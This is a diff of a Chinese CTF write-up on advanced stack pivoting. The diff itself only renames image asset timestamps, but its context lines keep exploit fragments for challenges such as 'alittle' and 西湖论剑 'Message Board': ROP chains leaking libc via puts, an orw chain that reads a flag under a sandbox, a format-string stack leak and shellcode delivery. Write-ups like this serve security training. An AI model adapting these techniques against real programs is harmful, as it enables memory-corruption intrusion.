@@ -4,7 +4,7 @@
 
 栈迁移（Stack Pivoting）进阶
 
-- - -
+* * *
 
 # 栈迁移进阶
 
@@ -17,7 +17,7 @@
 
 #### alittle
 
-[![](assets/1700186910-dc606b0688661205590e2e63f848e101.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170236-e2d3f788-845e-1.png)
+[![](assets/1701606597-dc606b0688661205590e2e63f848e101.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170236-e2d3f788-845e-1.png)
 
 ```plain
 bss6 = 0x601000+0x600
@@ -27,15 +27,15 @@ p.send(pl)
 
 但read后会往后执行会走向结束，rsp并没有被我们所控制，所以我们还不能控制程序流
 
-[![](assets/1700186910-2d88d05c487f700786e84348a400f45c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170243-e6ea0f1a-845e-1.png)
+[![](assets/1701606597-2d88d05c487f700786e84348a400f45c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170243-e6ea0f1a-845e-1.png)
 
 回头看一下leave处 `mov esp,ebp; pop ebp;`​，应该是leave前0x60
 
 1600未能放入rbp导致的
 
-[![](assets/1700186910-3a56de29af806f518eada3b52cdd3dac.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170249-eaa9dd1a-845e-1.png)
+[![](assets/1701606597-3a56de29af806f518eada3b52cdd3dac.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170249-eaa9dd1a-845e-1.png)
 
-[![](assets/1700186910-b1861dd4b19a7ccaa10fb368b0691916.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170254-edb2df84-845e-1.png)
+[![](assets/1701606597-b1861dd4b19a7ccaa10fb368b0691916.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170254-edb2df84-845e-1.png)
 
 再构造一次read，并调整rsp
 
@@ -46,7 +46,7 @@ p.send(pl)
 
 这里bss6所加的就是buf的偏移
 
-[![](assets/1700186910-d8042a88f280a703f9dcfb4f47d562df.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170301-f1968a92-845e-1.png)
+[![](assets/1701606597-d8042a88f280a703f9dcfb4f47d562df.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170301-f1968a92-845e-1.png)
 
 rsp调试正常后，那么我们下一次则可以进行rop链构造
 
@@ -57,21 +57,21 @@ pl = p64(bss6+0x20+0x10)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main) #3
 
 ​`bss6+0x20`​基础上再加0x10（固定模板）
 
-[![](assets/1700186910-e9a85b45c1025b963df6fcc54ca4f7f7.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170308-f5ee2db6-845e-1.png)
+[![](assets/1701606597-e9a85b45c1025b963df6fcc54ca4f7f7.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170308-f5ee2db6-845e-1.png)
 
 ‍
 
-[![](assets/1700186910-11e0ee2cc2e074b08bb78e7bfcf73258.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170312-f84f2790-845e-1.png)
+[![](assets/1701606597-11e0ee2cc2e074b08bb78e7bfcf73258.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170312-f84f2790-845e-1.png)
 
 ```plain
 pl = b'a'*0x20+p64(bss6+0x40)+p64(read) #4
 ```
 
-[![](assets/1700186910-b46786b4d9f94d1e8a9ad19d7a3f0904.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170320-fd66d714-845e-1.png)
+[![](assets/1701606597-b46786b4d9f94d1e8a9ad19d7a3f0904.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170320-fd66d714-845e-1.png)
 
-[![](assets/1700186910-05567e95d8001bcfbfcbe11972cca579.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170324-ff8c579e-845e-1.png)
+[![](assets/1701606597-05567e95d8001bcfbfcbe11972cca579.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170324-ff8c579e-845e-1.png)
 
-[![](assets/1700186910-7bd2d737d7b2a9ba93e72190c1416893.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170328-022e8fe4-845f-1.png)
+[![](assets/1701606597-7bd2d737d7b2a9ba93e72190c1416893.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170328-022e8fe4-845f-1.png)
 
 蚌埠住了，栈平衡真的好玄学，sys调了好久都不行，换og一把出了
 
@@ -99,13 +99,13 @@ constraints:
 '''
 ```
 
-[![](assets/1700186910-6e839b5c7e8e9164fb03390fafcb8b65.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170334-0588b2d2-845f-1.png)
+[![](assets/1701606597-6e839b5c7e8e9164fb03390fafcb8b65.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170334-0588b2d2-845f-1.png)
 
 ‍
 
 #### alittle-up
 
-[![](assets/1700186910-b274ff1d4dddd310977f2691b6c310af.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170338-0822b9c0-845f-1.png)
+[![](assets/1701606597-b274ff1d4dddd310977f2691b6c310af.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170338-0822b9c0-845f-1.png)
 
 相较前一题加了个沙盒
 
@@ -205,9 +205,9 @@ pause()
 p.send('flag')
 ```
 
-[![](assets/1700186910-38e4655bb25f45df0a325ead09d622b4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170350-0ee87556-845f-1.png)
+[![](assets/1701606597-38e4655bb25f45df0a325ead09d622b4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170350-0ee87556-845f-1.png)
 
-[![](assets/1700186910-a028ede4e02adaa0c0227a95a22d1ce9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170354-115f8522-845f-1.png)
+[![](assets/1701606597-a028ede4e02adaa0c0227a95a22d1ce9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170354-115f8522-845f-1.png)
 
 pl 6、7再次构造，并调整rsp
 
@@ -242,7 +242,7 @@ stack = int(p.recv(14),16)
 li(hex(stack))
 ```
 
-[![](assets/1700186910-0c76cc30bb643fc9c4ee5400908ed2c9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170437-2b5949c2-845f-1.png)
+[![](assets/1701606597-0c76cc30bb643fc9c4ee5400908ed2c9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170437-2b5949c2-845f-1.png)
 
 首先第一点就是back()里的read就是向stack地址输入的
 
@@ -254,7 +254,7 @@ p.sendline(pl)
 
 直接栈迁移到pl的前一栈帧处，然后执行
 
-[![](assets/1700186910-034247293bcfb38aac5c0376c467c492.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170444-2f2085c0-845f-1.png)
+[![](assets/1701606597-034247293bcfb38aac5c0376c467c492.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170444-2f2085c0-845f-1.png)
 
 ```plain
 def dbg():
@@ -699,9 +699,9 @@ r.interactive()
 
 ### 西湖论剑-Message Board
 
-[![](assets/1700186910-7b0511c5591ff496bc5f2ac0f3851c06.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170501-39ad1724-845f-1.png)
+[![](assets/1701606597-7b0511c5591ff496bc5f2ac0f3851c06.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170501-39ad1724-845f-1.png)
 
-[![](assets/1700186910-960578ddacb1d2dc09f71cc5b62d9588.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170505-3ba9e958-845f-1.png)
+[![](assets/1701606597-960578ddacb1d2dc09f71cc5b62d9588.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170505-3ba9e958-845f-1.png)
 
 格式字符串漏洞获取栈地址，下一处读入利用栈地址获取libc基址
 
@@ -715,9 +715,9 @@ p.send(payload)
 
 两次leave\_ret将rsp矫正
 
-[![](assets/1700186910-c4cef843a20806b6eabc2d3cc659d768.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170511-3f377bd0-845f-1.png)
+[![](assets/1701606597-c4cef843a20806b6eabc2d3cc659d768.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170511-3f377bd0-845f-1.png)
 
-[![](assets/1700186910-ef0d91dab735a31157ca0ab5f91aa4e2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170515-41f63c76-845f-1.png)
+[![](assets/1701606597-ef0d91dab735a31157ca0ab5f91aa4e2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170515-41f63c76-845f-1.png)
 
 **orw：**
 
@@ -731,7 +731,7 @@ payload+= p64(stack_addr)+p64(0x4012e0)
 p.send(payload)
 ```
 
-[![](assets/1700186910-55e80d57047948f26a843b42ed0c1ea8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170522-45cc390e-845f-1.png)
+[![](assets/1701606597-55e80d57047948f26a843b42ed0c1ea8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170522-45cc390e-845f-1.png)
 
 ```plain
 orw = p64(pop_rdi)+p64(stack_addr+0xd0)+p64(pop_rsi)+p64(0)+p64(open_addr)
@@ -746,7 +746,7 @@ orw+= p64(stack_addr+0x28-8)+p64(0x4012e0)
 p.send(orw)
 ```
 
-[![](assets/1700186910-5205391a08efb80f8c296a96580b3b41.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170529-49e6b12c-845f-1.png)
+[![](assets/1701606597-5205391a08efb80f8c296a96580b3b41.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116170529-49e6b12c-845f-1.png)
 
 exp：
 
@@ -872,4 +872,4 @@ p.send(sc)
 
 ‍
 
-![](assets/1700186910-c1a690c3008373b105f447e452f0cfec.gif)附件.zip (0.833 MB) [下载附件](https://xzfile.aliyuncs.com/upload/affix/20231116173747-cd45d936-8463-1.zip)
+![](assets/1701606597-d03a5e4b40ff92d0dd5ebf3823a3802c.gif)附件.zip (0.833 MB) [下载附件](https://xzfile.aliyuncs.com/upload/affix/20231116173747-cd45d936-8463-1.zip)
